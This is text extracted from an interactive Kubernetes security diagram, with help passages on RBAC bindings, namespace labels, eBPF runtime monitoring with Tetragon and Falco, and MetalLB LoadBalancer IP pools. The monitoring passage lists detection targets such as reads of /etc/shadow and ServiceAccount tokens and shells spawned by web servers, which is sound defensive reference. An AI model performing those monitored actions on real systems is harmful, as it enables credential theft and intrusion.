Avoid ClusterRoleBindings for app teams, avoid giving them the admin role unless they should manage RBAC themselves, and never bind to the default ServiceAccount. Review who can create RoleBindings: that right lets someone grant themselves more.

ellipse.style: fill: light-dark(rgb(255, 122, 122), rgb(198, 84, 84)); stroke: light-dark(rgb(122, 20, 20), rgb(255, 183, 183));

g.data-help:
Namespace labels
Labels on the namespace drive a lot of security: Pod Security Admission levels (pod-security.kubernetes.io/enforce), which admission policies apply, mesh injection, NetworkPolicy namespaceSelectors and cost or team ownership.
Treat them as configuration: set them from GitOps, and restrict who can change them, since changing a label can switch a control off.

ellipse.style: fill: light-dark(rgb(255, 242, 166), rgb(45, 34, 0)); stroke: light-dark(rgb(182, 138, 0), rgb(156, 119, 0));

g.data-help: Kernel Activity (what runtime instrumentation sees) A container process is a normal host process: every exec, file open and connection goes through the host kernel. Runtime security tools (Tetragon, Falco) attach eBPF programs to kernel hooks and read the activity there, without an agent in the pod and regardless of what the image contains. Each event carries the task's cgroup ID and namespace IDs, which the tool maps to container, Pod, namespace and workload via the container runtime (CRI) and the Kubernetes API. Sources - process-exec: execve/execveat, tracepoint sched_process_exec, LSM hook bprm_check_security. Binary, arguments, UID/GID, capabilities, cwd. - process-tree: built by the tool from fork (wake_up_new_task, sched_process_fork) and exit (acct_process, sched_process_exit). Parent chain back to containerd-shim/runc, so a shell spawned by a web server stands out. - syscalls: raw tracepoints sys_enter/sys_exit (Falco's base source), or kprobes on single syscalls such as __x64_sys_setuid or __x64_sys_ptrace (Tetragon TracingPolicy). - network: tcp_connect, inet_csk_accept, tcp_sendmsg, udp_sendmsg, tcp_close, tracepoint sock:inet_sock_set_state. 5-tuple per process, not only per pod. - socket: security_socket_create, security_socket_bind, security_socket_listen, security_socket_connect. Unexpected listeners, raw and packet sockets. - file-access: security_file_open, security_file_permission, security_mmap_file, fd_install. Reads of /etc/shadow, ServiceAccount tokens, host paths. - file-change: security_path_unlink, security_path_rename, security_path_chmod, security_path_truncate, security_inode_setattr. Dropped binaries, changed configs. Hook types - Tracepoints are a stable kernel interface. - Kprobes/fentry can hook any kernel function, but names and arguments change between kernel versions. - LSM BPF hooks (CONFIG_BPF_LSM) and functions that allow error injection can also deny: Tetragon can override the return value or send SIGKILL in the kernel, before the action completes. Falco is syscall-based: file and network activity are read from the syscalls. Tetragon hooks the kernel functions behind them, which avoids TOCTOU gaps in syscall arguments. Limits - Kata, gVisor and VMs run the workload on their own guest kernel or sandbox: the host's eBPF sees the sandbox, not the process inside. - Hooking every syscall or file read costs CPU. Filter in the kernel (Tetragon selectors, Falco's event set) and send on only what matters. - Events stay on the node; forward them to a central system to correlate and keep them.

display: inline-block; font-size: 12px; font-family: Helvetica; color: light-dark(#0A3D5A, #9cc8e1); line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal;

g.data-help:
LoadBalancer IP
The external IP a LoadBalancer Service gets. On-prem it comes from a pool managed by MetalLB or Cilium LB-IPAM and is announced into the network: by BGP to the routers, or by L2 (ARP/NDP) on the local segment.
It is an address, not an extra hop: traffic to it reaches a node directly and is forwarded into the Service.
Which namespaces may take an IP from the pool, and where the pool is announced, decides what can be published to the outside. Without limits on the pool, any LoadBalancer Service in any namespace can expose an app.
g.data-tags: level-3 info Network Network.Ingress Ingress Ingress.GatewayApi Ingress.GatewayApi.Gateway
g.data-help.yaml.announced_ip_pool: # Pool for LoadBalancer Services, only for ingress-nginx, announced to the routers over BGP apiVersion: metallb.io/v1beta1 kind: IPAddressPool metadata: name: lb-pool namespace: metallb-system spec: addresses: - 10.20.8.0/24 autoAssign: false serviceAllocation: namespaces: - ingress-nginx --- apiVersion: metallb.io/v1beta1 kind: BGPAdvertisement metadata: name: lb-pool namespace: metallb-system spec: ipAddressPools: - lb-pool

box-sizing: border-box; font-size: 0; text-align: center; color: #0A3D5A;
display: inline-block; font-size: 9px; font-family: Helvetica; color: light-dark(#0A3D5A, #9cc8e1); line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal;
